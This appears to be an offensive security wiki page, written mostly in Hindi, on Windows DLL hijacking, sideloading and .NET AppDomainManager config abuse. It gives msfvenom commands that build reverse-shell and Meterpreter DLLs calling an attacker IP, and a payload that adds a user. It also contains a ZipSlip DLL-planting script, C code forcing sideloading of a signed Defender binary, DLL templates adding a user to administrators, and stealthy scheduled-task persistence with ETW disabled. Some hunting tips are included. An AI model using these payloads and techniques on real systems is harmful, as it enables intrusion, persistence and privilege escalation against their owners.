# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में किसी भरोसेमंद application को malicious DLL लोड करने के लिए बाध्य किया जाता है। इस शब्द में **DLL Spoofing, Injection और Side-Loading** जैसी कई रणनीतियाँ शामिल हैं। इसका उपयोग मुख्यतः code execution और persistence हासिल करने के लिए, और कम मामलों में privilege escalation के लिए किया जाता है। यहाँ escalation पर ध्यान देने के बावजूद, hijacking का तरीका अलग-अलग उद्देश्यों में एक जैसा रहता है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके अपनाए जाते हैं। हर तरीके की प्रभावशीलता application की DLL loading strategy पर निर्भर करती है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: असली DLL को malicious DLL से बदलना। वैकल्पिक रूप से, मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग किया जा सकता है।
2. **DLL Search Order Hijacking**: malicious DLL को search path में वैध DLL से पहले रखना और application के search pattern का फायदा उठाना।
3. **Phantom DLL Hijacking**: application के लिए एक malicious DLL बनाना, ताकि वह उसे ऐसी आवश्यक DLL समझकर लोड करे जो वास्तव में मौजूद नहीं है।
4. **DLL Redirection**: application को malicious DLL की ओर निर्देशित करने के लिए `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters में बदलाव करना।
5. **WinSxS DLL Replacement**: WinSxS directory में वैध DLL को उसके malicious विकल्प से बदलना। यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: copied application के साथ malicious DLL को user-controlled directory में रखना। यह Binary Proxy Execution तकनीकों जैसा है।

कोई application अपना **DLL loader** भी लागू कर सकती है। कोई privileged process `Libraries` या `Plugins` जैसी child directory की फ़ाइलें सूचीबद्ध कर सकता है और सामान्य Windows DLL search order से स्वतंत्र होकर चुनी गई DLL किसी helper को दे सकता है। अगर कोई दूसरा account उस सटीक directory में files बना सकता है, तो इसे जाँच का एक सुराग मानें: process की identity, directory की प्रभावी ACL, file-selection rule और पहुँच योग्य load operation की पुष्टि करें। किसी executable के पास writable directory होने से यह साबित नहीं होता कि process वहाँ से DLLs लोड करता है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

किसी भरोसेमंद **.NET Framework** process से attacker code लोड कराने का एकमात्र तरीका classic DLL sideloading नहीं है। अगर target executable एक **managed** application है, तो CLR executable के नाम वाली **application configuration file** भी देखता है (उदाहरण के लिए `Setup.exe.config`)। इस file में custom **AppDomainManager** तय किया जा सकता है। अगर config, EXE के पास रखी attacker-controlled assembly की ओर संकेत करता है, तो CLR उसे **application के सामान्य code path से पहले** लोड करता है और उसे भरोसेमंद process के भीतर चलाता है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager का उपयोग करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों मौजूद होने चाहिए।<sup>[[16]](#references)[[17]](#references)</sup>

न्यूनतम config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

न्यूनतम प्रबंधक:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Practical notes:
- यह **.NET Framework specific** tradecraft है। यह Win32 DLL search order के बजाय CLR config parsing पर निर्भर करता है।
- Host वास्तव में **managed EXE** होना चाहिए। Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable name से बिल्कुल मेल होना चाहिए (`<binary>.config`) और यह आमतौर पर **EXE के बगल में** होता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है, क्योंकि trusted EXE में बदलाव नहीं होता और malicious managed assembly उसी process में execute होती है।
- यदि आपके पास पहले से writable installer/update directory है, तो AppDomainManager hijacking को **first stage** के रूप में इस्तेमाल किया जा सकता है, जिसके बाद बाद के stages के लिए classic DLL sideloading या reflective loading का उपयोग किया जा सकता है।

### AppDomainManager को downloader + scheduled-task bootstrap के रूप में इस्तेमाल करना

एक व्यावहारिक intrusion pattern में trusted managed EXE को malicious `*.config` और malicious AppDomainManager DLL, दोनों के साथ जोड़ा जाता है। यह DLL केवल **छोटे bootstrapper** की तरह काम करती है:<sup>[[25]](#references)</sup>

1. User किसी विश्वसनीय लगने वाली जगह, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater लॉन्च करता है।
2. साथ में मौजूद config, CLR से attacker assembly को **legitimate app logic शुरू होने से पहले** load करवाती है।
3. Malicious manager एक **path gate** करता है (उदाहरण के लिए, केवल तभी आगे बढ़ना जब host EXE `Downloads` से चल रहा हो, और second stage को केवल `%LOCALAPPDATA%` से चलने देना)।
4. Check पास होने पर यह real payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path में download करता है और scheduled task के ज़रिए persistence स्थापित करता है।

यह variant क्यों महत्वपूर्ण है:
- Signed host EXE में बदलाव नहीं होता, इसलिए केवल main binary का hash देखने वाली triage इस compromise को चूक सकती है।
- साधारण **path-based anti-analysis** आम है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से जानबूझकर chain टूट सकती है।
- First-stage AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि real implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर दिखने वाला minimal persistence example:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` का अर्थ उस user/session के लिए **उपलब्ध सबसे ऊँचा स्तर** है; अपने-आप में यह SYSTEM तक escalation की गारंटी नहीं देता।
- इस technique को अक्सर classic missing-DLL search-order hijacking के बजाय **.NET config abuse के ज़रिए execution/persistence** के रूप में वर्गीकृत करना अधिक उचित है, हालांकि operators अक्सर दोनों को chain करते हैं।

Detection pivots:
- ZIP extraction paths, `Downloads`, `%TEMP%` या अन्य user-writable folders से launch किए गए signed .NET executables, जिनके साथ एक **colocated** `<exe>.config` हो।
- ऐसे नए scheduled tasks जिनका action `%LOCALAPPDATA%`, `%APPDATA%` या `Downloads` के अंदर के path की ओर इशारा करता हो और जिनके नाम browser/vendor updaters जैसे लगते हों।
- ऐसे अल्पकालिक managed bootstrap processes जो तुरंत एक और EXE download करते हैं, फिर `schtasks.exe` spawn करते हैं।
- ऐसे samples जो तब तक जल्दी exit हो जाते हैं, जब तक executable path किसी अपेक्षित user-profile directory से मेल न खाए।

### Sideload chain को फिर से launch करने के लिए किसी मौजूदा scheduled task को hijack करना

Persistence के लिए, केवल **नया task बनाने** की तलाश न करें। कुछ intrusion sets तब तक इंतज़ार करते हैं जब तक कोई legitimate installer एक **सामान्य updater task** न बना दे, फिर वे **task action को rewrite** करते हैं, ताकि मौजूदा नाम, author और trigger defenders को परिचित लगें।

Reusable workflow:
1. Legitimate software install/run करें और उस task की पहचान करें जिसे वह आमतौर पर बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action बदलें, ताकि task user-writable staging directory से आपका **trusted host EXE** शुरू करे; यह फिर असली payload को side-load या AppDomain-load करता है।
4. कोई नया, स्पष्ट persistence artifact बनाने के बजाय उसी task name को फिर से register करें।

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

यह अधिक stealthy क्यों है:
- Task का नाम वैध दिख सकता है (उदाहरण के लिए, किसी vendor का updater)।
- इसे **Task Scheduler service** लॉन्च करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय अपेक्षित scheduling chain दिखती है।
- जो DFIR टीम केवल **नए task names** खोजती हैं, वे ऐसा task चूक सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसका action अब `%LOCALAPPDATA%`, `%APPDATA%` या attacker के नियंत्रण वाले किसी अन्य path की ओर इंगित करता है।

तेज़ी से hunt करने के तरीके:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की तुलना baseline से करें।
- जब **vendor जैसा दिखने वाला updater task** **user-writable directories** से execute हो या साथ में मौजूद `*.config` file वाली .NET EXE लॉन्च करे, तो alert दें।

> [!TIP]
> HTML staging, AES-CTR configs और .NET implants को DLL sideloading के साथ जोड़ने वाली step-by-step chain के लिए, नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing DLLs ढूँढना

किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **नीचे दिए गए 2 filters सेट करना** है:

![Common Techniques - Missing DLLs ढूँढना: किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से procmon चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (961).png>)

![Common Techniques - Missing DLLs ढूँढना: किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से procmon चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![Common Techniques - Missing DLLs ढूँढना: और केवल File System Activity दिखाएँ](<../../../images/image (153).png>)

अगर आप **सामान्य तौर पर missing DLLs** ढूँढ रहे हैं, तो इसे कुछ **seconds** तक चलने दें।\
अगर आप किसी **विशिष्ट executable में missing DLL** ढूँढ रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter सेट करें, उसे execute करें और events की capturing रोक दें।<sup>[[9]](#references)</sup>

## Missing DLLs का Exploitation

Privileges escalate करने के लिए, ऐसी **DLL** ढूँढें जिसे कोई privileged process ऐसी location से load करने की कोशिश करता है जहाँ आप लिख सकते हैं। ऐसा तब हो सकता है जब आप उस directory को control करते हों जिसे legitimate DLL वाली directory से पहले search किया जाता है, या जब माँगी गई DLL मौजूद न हो और आप search की गई directories में से किसी एक में लिख सकते हों।

### Dll Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **में आप देख सकते हैं कि DLLs को खास तौर पर कैसे load किया जाता है।**

**Windows applications** पहले से तय **search paths** के एक समूह को निर्धारित क्रम में देखते हुए DLLs खोजती हैं। DLL hijacking की समस्या तब आती है जब कोई harmful DLL इन directories में से किसी एक में इस तरह रखी जाती है कि वह authentic DLL से पहले load हो जाए। इससे बचने का एक तरीका यह है कि application अपनी ज़रूरत की DLLs के लिए absolute paths का इस्तेमाल करे।

नीचे **32-bit** systems का **DLL search order** दिया गया है:

1. वह directory जहाँ से application load हुई है।
2. system directory। इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का उपयोग करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path पाने के लिए कोई function नहीं है, लेकिन इसे search किया जाता है। (_C:\Windows\System_)
4. Windows directory। इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का उपयोग करें।
   1. (_C:\Windows_)
5. current directory।
6. PATH environment variable में सूचीबद्ध directories। ध्यान दें कि इसमें **App Paths** registry key में दिया गया per-application path शामिल नहीं है। DLL search path तय करते समय **App Paths** key का उपयोग नहीं होता।

यह **SafeDllSearchMode** enabled होने पर लागू **default** search order है। इसके disabled होने पर current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर set करें (default रूप से enabled)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, DLL को नाम के बजाय absolute path से load किया जा सकता है। ऐसी स्थिति में, Windows DLL के लिए केवल उसी path को देखता है; नाम से माँगी गई dependencies फिर भी लागू search order का पालन करती हैं।

Search order बदलने के दूसरे तरीके भी हैं, लेकिन मैं यहाँ उनकी व्याख्या नहीं करूँगा।

### Arbitrary file write को missing-DLL hijack में chain करना

**संबंधित technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. ऐसी DLL names इकट्ठा करने के लिए **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का उपयोग करें जिन्हें process ढूँढने की कोशिश करता है, लेकिन नहीं पा पाता।<sup>[[14]](#references)</sup>
2. अगर binary **schedule/service** के तहत चलती है, तो इनमें से किसी नाम वाली DLL को **application directory** (search-order entry #1) में रखने पर वह अगली execution में load होगी। .NET scanner के एक मामले में, process ने असली copy को `C:\Program Files\dotnet\fxr\...` से load करने से पहले `C:\samples\app\` में `hostfxr.dll` खोजी।
3. किसी भी export वाली payload DLL बनाएँ (जैसे reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`।
4. अगर आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसी ZIP बनाएँ जिसका entry extraction dir से बाहर निकलकर DLL को app folder में रख दे:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Archive को watched inbox/share में deliver करें; जब scheduled task process को दोबारा launch करेगा, तो यह malicious DLL load करेगा और आपका code service account के रूप में execute करेगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए sideloading को बाध्य करना

नए बनाए गए process के DLL search path को deterministically प्रभावित करने का एक advanced तरीका यह है कि ntdll के native APIs से process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath field सेट की जाए। यहां attacker-controlled directory देने पर, ऐसा target process जो imported DLL को नाम से resolve करता है (बिना absolute path के और safe loading flags का उपयोग किए बिना), उस directory से malicious DLL load करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएं और custom DllPath दें, जो आपके नियंत्रित folder (जैसे, वह directory जहां आपका dropper/unpacker मौजूद है) की ओर इंगित करता हो।
- RtlCreateUserProcess से process बनाएं। जब target binary किसी DLL को नाम से resolve करेगी, तो loader resolution के दौरान दिए गए DllPath को देखेगा, जिससे reliable sideloading संभव होगा, भले ही malicious DLL target EXE के साथ उसी directory में न हो।

नोट्स/सीमाएं
- इसका असर बनाए जा रहे child process पर होता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को किसी DLL को नाम से import या LoadLibrary करना चाहिए (बिना absolute path के और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग किए बिना)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत error handling):

<details>
<summary>पूरा C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए DLL sideloading को बाध्य करना</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operational usage example
- अपनी DllPath directory में एक malicious xmllite.dll रखें (जो आवश्यक functions export करती हो या वास्तविक DLL को proxy करती हो)।
- ऐसी signed binary लॉन्च करें जिसके बारे में पता हो कि वह ऊपर दी गई technique से नाम के आधार पर xmllite.dll खोजती है। Loader दिए गए DllPath के ज़रिए import resolve करता है और आपकी DLL को sideload करता है।

इस technique का उपयोग वास्तविक हमलों में multi-stage sideloading chains चलाने के लिए देखा गया है: शुरुआती launcher एक helper DLL छोड़ता है, जो फिर custom DllPath के साथ Microsoft-signed, hijackable binary चलाता है, ताकि attacker की DLL staging directory से load हो सके।<sup>[[6]](#references)</sup>


### `.exe.config` के ज़रिए .NET AppDomainManager hijacking

**.NET Framework** targets के लिए, application की पास वाली **`.exe.config`** file का दुरुपयोग करके memory patch किए बिना **`Main()` से पहले** sideloading की जा सकती है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक legitimate .NET EXE के साथ malicious config और attacker-controlled एक या अधिक assemblies रखता है।

यह chain कैसे काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE शुरू होता है और **CLR `<exe>.config` पढ़ता है**।
2. Config **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट करता है, ताकि runtime attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager को trusted host process के अंदर **`Main()` से पहले execution** मिलता है।
4. यही config CLR को पहले local assemblies resolve करने के लिए बाध्य कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमज़ोर कर सकता है।

Campaign-style pattern (निर्देश / CLR version के अनुसार nesting का सटीक रूप अलग हो सकता है):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

यह क्यों उपयोगी है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह फ़ोल्डर एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान, वैध app logic चलने से पहले, execution को attacker code में ले जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies load करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** publisher-policy redirects को नए assemblies की ओर जाने से रोकता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक निश्चित बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** खास तौर पर दिलचस्प है, क्योंकि implant द्वारा memory में `EtwEventWrite` patch करने के बजाय, configuration के ज़रिए **CLR अपनी ETW visibility बंद कर देता है**।

हाल के campaigns में देखा गया operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config` और local assemblies रखे जाते हैं।
- Stage 2 में इन्हें किसी विश्वसनीय दिखने वाले **AppData update** फ़ोल्डर में copy किया जाता है, host का नाम बदलकर `update.exe` जैसा कुछ रखा जाता है और उसे **scheduled task** के ज़रिए दोबारा launch किया जाता है।
- Stage 3 में final RAT DLL/export load करने से पहले execution context (उदाहरण के लिए, Task Scheduler से अपेक्षित parent `svchost.exe`) की पुष्टि की जाती है।

Hunting के सुझाव:
- User-writable locations में संदिग्ध साथ वाली **`.config`** files के साथ चलने वाले signed या अन्यथा वैध **.NET executables**।
- ऐसी `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** हों।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-विशिष्ट `\bin\update\` directories से renamed update binaries को दोबारा launch करते हों।
- ऐसे parent/child chains जिनमें scheduled task किसी trusted .NET host को launch करे और वह तुरंत अपनी directory से non-vendor assemblies load करे।

#### Windows docs में dll search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब **memory में पहले से loaded DLL के समान नाम वाली DLL** मिलती है, तो system सामान्य search को छोड़ देता है। इसके बजाय, वह redirection और manifest की जाँच करता है और फिर memory में पहले से मौजूद DLL का उपयोग करता है। **इस स्थिति में, system DLL की खोज नहीं करता**।
- यदि DLL को मौजूदा Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो system उसकी version और उसकी dependent DLLs का उपयोग करता है और **search process छोड़ देता है**। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की सूची होती है।
- यदि किसी **DLL की dependencies** हैं, तो उन dependent DLLs की खोज ऐसे की जाती है मानो उन्हें केवल उनके **module names** से निर्दिष्ट किया गया हो—भले ही शुरुआती DLL की पहचान full path के ज़रिए हुई हो।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसा process पहचानें जो **अलग privileges** (horizontal या lateral movement) के तहत चलता हो या चलेगा, और जिसमें **DLL मौजूद न हो**।
- सुनिश्चित करें कि किसी भी ऐसी **directory** में **write access** उपलब्ध हो जिसमें **DLL** खोजी जाएगी। यह executable की directory या system path के अंदर कोई directory हो सकती है।

आम तौर पर ये शर्तें पूरी नहीं होतीं: privileged executables में आमतौर पर DLL dependencies गायब नहीं होतीं, और सामान्य users को system search-path directories में लिखने की अनुमति नहीं होती। फिर भी, misconfigured environments में ये दोनों स्थितियाँ सामने आ सकती हैं।\
यदि ये शर्तें पूरी हों, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। हालाँकि इसका मुख्य उद्देश्य UAC bypass है, इसमें कुछ Windows versions के लिए DLL-hijacking PoCs हैं, जिन्हें अक्सर आपके मिले writable directory के अनुसार बदला जा सकता है।

ध्यान दें कि आप **किसी folder में अपनी permissions** इस तरह **जाँच सकते हैं**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **PATH में मौजूद सभी फ़ोल्डरों की अनुमतियाँ जाँचें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप executable के imports और dll के exports भी जाँच सकते हैं:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path folder** में लिखने की permissions के साथ privileges escalate करने के लिए **DLL Hijacking का दुरुपयोग** करने की पूरी guide के लिए देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) जाँच करेगा कि आपके पास system PATH के अंदर किसी भी folder पर लिखने की permissions हैं या नहीं।\
इस vulnerability को खोजने के लिए अन्य दिलचस्प automated tools हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### Example

अगर आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे ज़रूरी बातों में से एक यह होगी कि **ऐसी dll बनाएँ जो executable द्वारा उससे import किए जाने वाले कम-से-कम सभी functions को export करे**। ध्यान दें कि DLL Hijacking, [Medium Integrity level से High **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)**.** escalate करने में भी काम आता है। **Valid dll बनाने का तरीका** आप execution के लिए DLL hijacking पर केंद्रित इस DLL hijacking study में देख सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले section** में आपको कुछ **basic dll codes** मिलेंगे, जो **templates** के रूप में या **बिना required functions export किए dll बनाने** के लिए उपयोगी हो सकते हैं।

## **DLLs बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** एक ऐसी DLL है जो **लोड होने पर आपका malicious code execute** कर सकती है, साथ ही **वास्तविक library को सभी calls relay करके** उसे **expose** करती है और **अपेक्षा के अनुसार काम** करती है।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) tool से आप वास्तव में **एक executable चुनकर वह library चुन सकते हैं** जिसे आप proxify करना चाहते हैं और **proxified dll generate कर सकते हैं**, या **DLL चुनकर** भी **proxified dll generate कर सकते हैं**।

### **Meterpreter**

**Rev shell प्राप्त करें (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Meterpreter (x86) प्राप्त करें:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक उपयोगकर्ता बनाएँ (x86; मुझे x64 version नहीं दिखा):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### आपका अपना

कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए हर function को export करना होगा**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर पाएगी और exploit विफल हो जाएगा।

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
